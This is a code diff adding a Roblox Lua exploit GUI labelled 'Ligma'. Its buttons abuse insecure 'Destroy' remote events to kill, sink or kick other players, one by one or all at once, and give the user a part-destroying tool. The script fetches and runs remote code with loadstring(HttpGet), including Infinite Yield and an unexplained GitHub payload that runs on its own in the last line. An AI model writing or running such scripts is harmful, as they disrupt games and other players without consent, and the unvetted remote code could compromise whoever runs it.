@@ -1,0 +1,347 @@
+-- PL Update
+-- Instances:
+
+game:GetObjects("rbxassetid://10808177630")[1].Parent = game.Players.LocalPlayer.PlayerGui
+local main = Instance.new("ScreenGui")
+local top = Instance.new("Frame")
+local label = Instance.new("TextLabel")
+local logo = Instance.new("ImageLabel")
+local back = Instance.new("Frame")
+local scripts = Instance.new("Frame")
+local kill = Instance.new("TextButton")
+local UIListLayout = Instance.new("UIListLayout")
+local kick = Instance.new("TextButton")
+local btools = Instance.new("TextButton")
+local sink = Instance.new("TextButton")
+local admin = Instance.new("TextButton")
+local executor = Instance.new("Frame")
+local c = Instance.new("TextButton")
+local target = Instance.new("TextBox")
+local clear = Instance.new("TextButton")
+
+--Properties:
+
+main.Name = "main"
+main.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+main.ResetOnSpawn = false
+
+top.Name = "top"
+top.Parent = main
+top.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+top.Position = UDim2.new(0.641512692, 0, 0.485714257, 0)
+top.Size = UDim2.new(0, 349, 0, 33)
+
+label.Name = "label"
+label.Parent = top
+label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+label.BorderSizePixel = 0
+label.Position = UDim2.new(0, 0, 4.62387561e-07, 0)
+label.Size = UDim2.new(0, 119, 0, 33)
+label.Font = Enum.Font.SourceSans
+label.Text = "Ligma"
+label.TextColor3 = Color3.fromRGB(0, 0, 0)
+label.TextSize = 16.000
+label.TextWrapped = true
+
+logo.Name = "logo"
+logo.Parent = top
+logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+logo.BackgroundTransparency = 1.000
+logo.BorderSizePixel = 0
+logo.Position = UDim2.new(0, 0, 4.62387561e-07, 0)
+logo.Size = UDim2.new(0, 33, 0, 33)
+logo.Image = "rbxassetid://7256706293"
+
+back.Name = "back"
+back.Parent = top
+back.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+back.Position = UDim2.new(0, 0, 1.00000048, 0)
+back.Size = UDim2.new(0, 349, 0, 192)
+
+scripts.Name = "scripts"
+scripts.Parent = back
+scripts.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+scripts.Position = UDim2.new(0.739255011, 0, 0.078125, 0)
+scripts.Size = UDim2.new(0, 79, 0, 162)
+
+kill.Name = "kill"
+kill.Parent = scripts
+kill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+kill.Size = UDim2.new(0, 79, 0, 26)
+kill.Font = Enum.Font.SourceSans
+kill.Text = "Kill"
+kill.TextColor3 = Color3.fromRGB(0, 0, 0)
+kill.TextScaled = true
+kill.TextSize = 14.000
+kill.TextWrapped = true
+
+UIListLayout.Parent = scripts
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+kick.Name = "kick"
+kick.Parent = scripts
+kick.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+kick.Size = UDim2.new(0, 79, 0, 26)
+kick.Font = Enum.Font.SourceSans
+kick.Text = "Ban"
+kick.TextColor3 = Color3.fromRGB(0, 0, 0)
+kick.TextScaled = true
+kick.TextSize = 14.000
+kick.TextWrapped = true
+
+btools.Name = "btools"
+btools.Parent = scripts
+btools.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+btools.Size = UDim2.new(0, 79, 0, 26)
+btools.Font = Enum.Font.SourceSans
+btools.Text = "BTools"
+btools.TextColor3 = Color3.fromRGB(0, 0, 0)
+btools.TextScaled = true
+btools.TextSize = 14.000
+btools.TextWrapped = true
+
+sink.Name = "sink"
+sink.Parent = scripts
+sink.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+sink.Size = UDim2.new(0, 79, 0, 26)
+sink.Font = Enum.Font.SourceSans
+sink.Text = "Sink"
+sink.TextColor3 = Color3.fromRGB(0, 0, 0)
+sink.TextScaled = true
+sink.TextSize = 14.000
+sink.TextWrapped = true
+
+admin.Name = "admin"
+admin.Parent = scripts
+admin.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+admin.Size = UDim2.new(0, 79, 0, 26)
+admin.Font = Enum.Font.SourceSans
+admin.Text = "Inf Yield"
+admin.TextColor3 = Color3.fromRGB(0, 0, 0)
+admin.TextScaled = true
+admin.TextSize = 14.000
+admin.TextWrapped = true
+
+executor.Name = "executor"
+executor.Parent = back
+executor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+executor.Position = UDim2.new(0.0487106033, 0, 0.078125, 0)
+executor.Size = UDim2.new(0, 231, 0, 162)
+
+c.Name = "c"
+c.Parent = executor
+c.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+c.Position = UDim2.new(0.732456207, 0, 0, 0)
+c.Size = UDim2.new(0, 61, 0, 162)
+c.Font = Enum.Font.SourceSans
+c.Text = "CLEAR"
+c.TextColor3 = Color3.fromRGB(0, 0, 0)
+c.TextScaled = true
+c.TextSize = 14.000
+c.TextWrapped = true
+
+target.Name = "target"
+target.Parent = executor
+target.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+target.Size = UDim2.new(0, 169, 0, 162)
+target.ClearTextOnFocus = false
+target.Font = Enum.Font.SourceSans
+target.PlaceholderText = "--Player's name here"
+target.Text = ""
+target.TextColor3 = Color3.fromRGB(0, 0, 0)
+target.TextSize = 14.000
+target.TextWrapped = true
+target.TextXAlignment = Enum.TextXAlignment.Left
+target.TextYAlignment = Enum.TextYAlignment.Top
+
+clear.Name = "clear"
+clear.Parent = top
+clear.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+clear.BorderSizePixel = 0
+clear.Position = UDim2.new(0.905444145, 0, 4.62387561e-07, 0)
+clear.Size = UDim2.new(0, 33, 0, 33)
+clear.Font = Enum.Font.SourceSans
+clear.Text = "X"
+clear.TextColor3 = Color3.fromRGB(255, 0, 0)
+clear.TextScaled = true
+clear.TextSize = 14.000
+clear.TextWrapped = true
+
+-- Scripts:
+
+local function EIYUFFO_fake_script() -- top.Dragify 
+	local script = Instance.new('LocalScript', top)
+
+	local UIS = game:GetService("UserInputService")
+	function dragify(Frame)
+	    dragToggle = nil
+	    local dragSpeed = 0
+	    dragInput = nil
+	    dragStart = nil
+	    local dragPos = nil
+	    function updateInput(input)
+	        local Delta = input.Position - dragStart
+	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
+	    end
+	    Frame.InputBegan:Connect(function(input)
+	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+	            dragToggle = true
+	            dragStart = input.Position
+	            startPos = Frame.Position
+	            input.Changed:Connect(function()
+	                if input.UserInputState == Enum.UserInputState.End then
+	                    dragToggle = false
+	                end
+	            end)
+	        end
+	    end)
+	    Frame.InputChanged:Connect(function(input)
+	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+	            dragInput = input
+	        end
+	    end)
+	    game:GetService("UserInputService").InputChanged:Connect(function(input)
+	        if input == dragInput and dragToggle then
+	            updateInput(input)
+	        end
+	    end)
+	end
+	
+	dragify(script.Parent)
+end
+coroutine.wrap(EIYUFFO_fake_script)()
+local function GNMP_fake_script() -- c.LocalScript 
+	local script = Instance.new('LocalScript', c)
+
+	local txt = script.Parent.Parent.target
+	local btn = script.Parent
+	
+	btn.MouseButton1Click:Connect(function()
+		txt.Text = "--Clearing"
+		wait(0.5)
+		txt.Text = "Clearing..."
+		wait(0.5)
+		txt.Text = "Clearing.."
+		wait(0.5)
+		txt.Text = "Clearing."
+		wait(0.5)
+		txt.Text = "Clearing..."
+		wait(0.5)
+		txt.Text = "Clearing.."
+		wait(0.5)
+		txt.Text = "Clearing."
+		wait(0.5)
+		txt.Text = "Clearing..."
+		wait(0.5)
+		txt.Text = "--Cleared Successfully"
+		wait(0.3)
+		txt.Text = " "
+	end)
+end
+coroutine.wrap(GNMP_fake_script)()
+local function TBGZU_fake_script() -- clear.exit 
+	local script = Instance.new('LocalScript', clear)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.top.Visible = false
+	end)
+end
+coroutine.wrap(TBGZU_fake_script)()
+
+for i,slaves in pairs(game:GetDescendants()) do
+	if slaves.Name == "DestroySegway" or slaves.Name == "" or slaves.Name == "Destroy" then
+		print("no u")
+		
+		kill.MouseButton1Down:connect(function()
+			if string.lower(target.Text) == "all" then
+				for i,c in pairs(game.Players:GetPlayers()) do
+					ohok = c.Character["Head"]
+					slaves:FireServer(ohok, {Value = ohok})
+				end
+			else
+				if game.Players:FindFirstChild(target.Text) then
+					if game.Players:FindFirstChild(target.Text).Character then
+						slaves:FireServer(game.Players:FindFirstChild(target.Text).Character.Head, {Value = game.Players:FindFirstChild(target.Text).Character.Head}) else
+						print("who?????")
+
+					end
+
+				end
+
+			end
+		end)
+
+		btools.MouseButton1Down:connect(function()
+			local Tool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
+			local Equipped = false
+
+			Tool.RequiresHandle = false
+			Tool.Name = "Destroy Tool"
+			local Field = Instance.new("SelectionBox",game.Workspace)
+			local Mouse = game.Players.LocalPlayer:GetMouse()
+			Field.LineThickness = 0.1
+
+			Tool.Equipped:connect(function()
+				Equipped = true
+
+				while Equipped == true do
+					if Mouse.Target ~= nil then
+						Field.Adornee = Mouse.Target
+
+					else
+						Field.Adornee = nil
+					end
+					wait()
+				end
+			end)
+
+			Tool.Unequipped:connect(function()
+				Equipped = false
+				Field.Adornee = nil
+			end)
+
+			Tool.Activated:connect(function()
+				if Mouse.Target ~= nil then
+					slaves:FireServer(Mouse.Target, {Value = Mouse.Target})
+					local AttemptTarget = Mouse.Target
+					while AttemptTarget ~= nil do
+						AttemptTarget.Velocity = Vector3.new(0,-1000000000000000,0)
+						AttemptTarget.CanCollide = false
+						wait()
+					end
+
+				end
+			end)
+		end)
+		
+		sink.MouseButton1Down:connect(function()
+			if string.lower(target.Text) == "all" then
+				for i,c in pairs(game.Players:GetPlayers()) do
+					ohok = c.Character.HumanoidRootPart
+					slaves:FireServer(ohok, {Value = ohok})
+				end
+			else
+				slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["HumanoidRootPart"], {Value = game.Players:FindFirstChild(target.Text).Character["HumanoidRootPart"]})
+			end
+		end)
+
+		kick.MouseButton1Down:connect(function()
+			if string.lower(target.Text) == "all" then
+				for i,c in pairs(game.Players:GetPlayers()) do
+					ohok = c
+					slaves:FireServer(ohok, {Value = ohok})
+				end
+			else
+				slaves:FireServer(game.Players:FindFirstChild(target.Text), {Value = game.Players:FindFirstChild(target.Text)})
+			end
+		end)
+		
+		admin.MouseButton1Down:connect(function()
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+		end)
+	end
+end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CyberCopLOL/-/main/h"))()
